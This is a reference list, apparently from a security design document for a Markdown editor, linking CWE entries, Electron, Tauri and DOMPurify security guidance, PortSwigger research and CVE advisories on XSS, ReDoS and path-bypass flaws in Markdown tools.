- MITRE CWE catalogue v4.8 (CWE-22, 23, 39, 40, 58, 59, 69, 1333) —
  <https://cwe.mitre.org/data/published/cwe_v4.8.pdf>
- Electron security checklist (the "untrusted content" warning) —
  <https://www.electronjs.org/docs/latest/tutorial/security>
- Tauri capabilities, "Security Boundaries: what it does not protect against" —
  <https://v2.tauri.app/security/capabilities/>
- DOMPurify Security Goals & Threat Model —
  <https://github.com/cure53/DOMPurify/wiki/Security-Goals-%26-Threat-Model>
- DOMPurify Attack Classes & Bypass History —
  <https://github.com/cure53/DOMPurify/wiki/Attack-Classes-%26-Bypass-History>
- CVE-2019-20374 — <https://nvd.nist.gov/vuln/detail/CVE-2019-20374>
- CVE-2022-21158 — <https://nvd.nist.gov/vuln/detail/CVE-2022-21158>
- CVE-2022-21680 / CVE-2022-21681 (ReDoS in `marked`) —
  <https://nvd.nist.gov/vuln/detail/CVE-2022-21680>,
  <https://nvd.nist.gov/vuln/detail/CVE-2022-21681>
- CVE-2023-2318 (MarkText paste → RCE) —
  <https://nvd.nist.gov/vuln/detail/CVE-2023-2318>
- CVE-2023-2317 (Typora DOM XSS) — <https://www.cve.org/CVERecord?id=CVE-2023-2317>
- CVE-2026-48988 (`markdown-it` typographer quadratic DoS) —
  <https://nvd.nist.gov/vuln/detail/CVE-2026-48988>
- CVE-2026-53571 (NTFS ADS + 8.3 short names path-deny bypass) —
  <https://www.sentinelone.com/vulnerability-database/cve-2026-53571>
- CVE-2026-47423, CVE-2026-65914, CVE-2026-0540, CVE-2024-45801 (DOMPurify) —
  <https://nvd.nist.gov/vuln/detail/CVE-2026-47423>,
  <https://nvd.nist.gov/vuln/detail/CVE-2026-65914>,
  <https://nvd.nist.gov/vuln/detail/CVE-2026-0540>,
  <https://nvd.nist.gov/vuln/detail/CVE-2024-45801>
- PortSwigger, DOM Clobbering strikes back —
  <https://portswigger.net/research/dom-clobbering-strikes-back>
